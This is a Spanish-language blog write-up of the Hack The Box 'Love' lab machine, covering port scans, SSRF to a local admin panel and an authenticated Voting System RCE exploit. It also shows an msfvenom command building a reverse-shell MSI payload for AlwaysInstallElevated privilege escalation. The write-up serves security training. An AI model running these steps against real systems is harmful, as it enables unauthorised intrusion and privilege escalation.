<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Love (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Love de la plataforma HackTheBox. Se trata de una máquina Windows de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Love de la plataforma HackTheBox. Se trata de una máquina Windows de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/love-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/love-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-07T21:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Love (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2021-08-07T21:00:00+02:00","datePublished":"2021-08-07T21:00:00+02:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina Love de la plataforma HackTheBox. Se trata de una máquina Windows de 64 bits, que posee una dificultad fácil de resolución según la plataforma.","headline":"Love (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/love-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/love-(hack-the-box)/"}</script><title>Love (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Love (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Love (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title=" 7 Aug 2021, 21:00" > 7 Aug 2021<i class="unloaded">2021-08-07T21:00:00+02:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1774 palabras">9 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina Love de la plataforma HackTheBox. Se trata de una máquina Windows de 64 bits, que posee una dificultad fácil de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_Love.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c"># nmap -p- --open -T5 -n -vv 10.10.10.239</span>

Not shown: 58766 closed ports, 6750 filtered ports
Reason: 58766 resets and 6750 no-responses
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
5000/tcp  open  upnp         syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
5986/tcp  open  wsmans       syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="c"># nmap -p 22,80 -sC -sV 10.10.10.239</span>

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span>
|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span><span class="k">in</span>
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-18T22:41:47+00:00<span class="p">;</span> +21m35s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m35s, deviation: 3h30m02s, median: 21m34s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 <span class="o">(</span>Windows 10 Pro 6.3<span class="o">)</span>
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE<span class="se">\x</span>00
|   Workgroup: WORKGROUP<span class="se">\x</span>00
|_  System <span class="nb">time</span>: 2021-07-18T15:41:37-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-07-18T22:41:33
|_  start_date: N/A
</pre></table></code></div></div><p>En este segundo escaneo <code class="language-plaintext highlighter-rouge">Nmap</code> consigue, a través del certificado SSL que utiliza el servicio HTTPS, enumerar el subdominio “staging.love.htb”. Con esta información, procedo a añadir el dominio principal y subdominio a mi fichero local “/etc/hosts’””.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/hosts.png" alt="Dominio añadido al fichero &quot;/etc/hosts&quot;" /></p><p>Una vez añadidos los dominios, paso a enumerar el contenido web de cada uno de ellos mediante un navegador. Al acceder al dominio mediante el servicio HTTPS me salta un error “403 Forbidden”, por lo que pruebo el acceso mediante el servicio HTTP y observo una página de login, aunque en estos momentos aún no dispongo de credenciales de ningún tipo.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/mainpage.png" alt="Página de login del dominio principal &quot;love.htb&quot;" /></p><p>Por otro lado, también compruebo el contenido del subdominio “staging.love.htb”. Nuevamente, me da el error 403 al acceder mediante HTTPS, por lo que vuelvo a hacerlo mediante HTTP. En la siguiente imagen se puede ver el contenido de la página web, que parece tratarse de un escáner para detectar malware en archivos:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/stagingpage.png" alt="Página web del subdominio &quot;staging.love.htb&quot;" /></p><p>Pruebo a registrarme a través de los campos que aparecen, pero compruebo que no es funcional. Por lo que paso a la pestaña “Demo”, en la que aparece una barra de búsqueda en la que hay que introducir la URL del archivo que se quiere escanear.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/stagingdemo.png" alt="Demo del escáner de archivos" /></p><p>Con la información recopilada, no tengo forma de avanzar en la resolución de la máquina, ya que no dispongo de credenciales ni he conseguido enumerar ningún servicio crítico. Por tanto, pruebo a enumerar otro servicio HTTP detectado en el puerto 5000 durante la primera fase de reconocimiento. Pero, al intentar acceder a este servicio, me encuentro de nuevo con un error “403 Forbidden”.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/forbidden5000.png" alt="Error 403 en el servicio HTTP del puerto 5000" /></p><p>En este punto, se me ocurre utilizar el buscador de URLs del servicio de escaneo de archivos enumerado anteriormente, para acceder de forma local al servicio HTTP del puerto 5000, ya que puede contar con algún tipo de regla que permita el acceso a redes internas, pero no externas. Al introducir la URL (http://localhost:5000), se me muestra el contenido web, que consiste en un panel en el que se muestran las credenciales del usuario “admin”.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/5000page.png" alt="Contenido del servicio HTTP del puerto 5000" /></p><p>Con las credenciales obtenidas, pruebo a acceder desde el portal de login que hemos visualizado anteriormente, pero me salta un error de credenciales incorrectas.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/noaccess.png" alt="Error de credenciales incorrectas en el panel login de &quot;love.htb&quot;" /></p><p>En este punto me encontré un poco perdido, ya que intenté enumerar algún otro servicio como SMB o MySQL sin obtener ningún resultado. Tras esto, se me ocurrió probar una búsqueda de directorios y/o ficheros en el servidor web con <code class="language-plaintext highlighter-rouge">Gobuster</code>, para ver si encontraba algo que me podía ser de utilidad.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.239/ -t 70

/images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/images/]
/Images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/admin/] 
/plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/includes/]
/examples             (Status: 503) [Size: 402]                                    
/dist                 (Status: 301) [Size: 336] [--&gt; http://10.10.10.239/dist/]    
/licenses             (Status: 403) [Size: 421]                                    
/IMAGES               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/IMAGES/]  
/%20                  (Status: 403) [Size: 302]                                    
/Admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/Admin/]   
/*checkout*           (Status: 403) [Size: 302]                                    
/Plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/Plugins/] 
/phpmyadmin           (Status: 403) [Size: 302]                                    
/webalizer            (Status: 403) [Size: 302]
</pre></table></code></div></div><p>De estas rutas obtenidas, la que más me llama la atención es la de “admin”, por lo que pruebo a acceder y, para mí sorpresa, encuentro un panel login idéntico al de “love.htb”.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/adminpage.png" alt="Cookie de autenticación asignada al acceder a la plataforma web" /></p><p>De nuevo, pruebo a intentar acceder utilizando las credenciales obtenidas anteriormente, consiguiendo acceder con éxito al panel de administrador.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/votingsystemadmin.png" alt="Panel de administrador de la plataforma Voting System" /></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Una vez dentro de la plataforma, intento buscar formas de subir algún archivo PHP o similar para poder obtener ejecución de comandos en la máquina víctima. Pero, al no obtener resultado, pruebo a buscar la plataforma en <code class="language-plaintext highlighter-rouge">SearchSploit</code> para comprobar si existe algún exploit.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># searchsploit Voting System

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                                                                                                             | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                                                                                                  | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                                                                                                         | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                                                                                                    | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                                                                                                         | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                                                                                                                         | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                                                | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                                                              | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                                                                                                                     | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection                                                                                                | php/webapps/50052.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</pre></table></code></div></div><p>Como se observa, hay varios exploits que afectan a la plataforma web utilizada. En este caso, me quedo con el exploit en Python que permite una Ejecución Remota de Código (RCE) estando autenticado en la plataforma. Antes de proceder a la ejecución de este exploit, se deben modificar en el código los valores que se muestran en la siguiente imagen:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/exploit49445.png" alt="Valores a modificar en el exploit de Python" /></p><p>Una vez modificado el exploit, me pongo a la escucha por el puerto definido y ejecuto el exploit obteniendo una conexión en mi máquina de atacante.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/revshell.png" alt="Obtención de shell en máquina atacante" /></p><p>Con la shell obtenida, ya puedo acceder al directorio del usuario no privilegiado Phoebe y visualizar la flag.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>type user.txt

8ad895c498ac7a42f8aa349704b6ddb0
</pre></table></code></div></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Para la escalada de privilegios en este sistema Windows, he transferido el ejecutable de <code class="language-plaintext highlighter-rouge">WinPEAS</code> a la máquina víctima y lo he ejecutado. Tras revisar los resultados arrojados, uno de los más interesantes y que el propio script te refleja en color rojo es el que se refleja en la siguiente imagen:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/alwaysinstallelevated.png" alt="Agujero de seguridad descubierto por el script WinPEAS" /></p><p>La política “AlwaysInstallElevated” se encuentra habilitada en el registro de Windows, una configuración que puede explotarse para escalar privilegios. Los pasos a seguir se reflejan en este <a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">artículo</a>. Lo primero a realizar es crear un ejecutable malicioso en formato .msi que se encargará de enviar una shell como usuario Administrador a mi máquina de atacante. Este ejecutable lo he creado mediante la utilidad <code class="language-plaintext highlighter-rouge">MSFVenom</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.75 LPORT=445 -f msi &gt; payload.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
</pre></table></code></div></div><p>Una vez creado el ejecutable, lo transfiero a la máquina, me pongo a la escucha por el puerto definido al crear el fichero y lo ejecuto con las flags “/quiet”, “/i” y “/qn”, obteniendo así una conexión en mi máquina de atacante y pudiendo visualizar la flag final.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Love/rooted.png" alt="Obtenemos una shell con privilegios de &quot;root&quot; y visualizamos la flag" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a> <a href="/tags/voting-system/" class="post-tag no-text-decoration" >voting_system</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/alwaysinstallelevated-privilege/" class="post-tag no-text-decoration" >alwaysinstallelevated_privilege</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Love (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/love-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Love (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/love-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Love (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/love-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tier-0-starting-point-machines-(hack-the-box)/"><div class="card-body"> <span class="timeago small" > 8 Jan<i class="unloaded">2022-01-08T18:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tier 0 Starting Point Machines (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de las máquinas de Tier 0 del “Starting Point” de la plataforma HackTheBox. Se trata de máquinas tanto Windows como Linux, que tie...</p></div></div></a></div><div class="card"> <a href="/posts/thenotebook-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >31 Jul 2021<i class="unloaded">2021-07-31T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheNotebook (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de...</p></div></div></a></div><div class="card"> <a href="/posts/knife-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >28 Aug 2021<i class="unloaded">2021-08-28T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Knife de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resol...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thenotebook-(hack-the-box)/" class="btn btn-outline-primary" prompt="Anterior"><p>TheNotebook (Hack The Box)</p></a> <a href="/posts/knife-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Knife (Hack The Box)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> 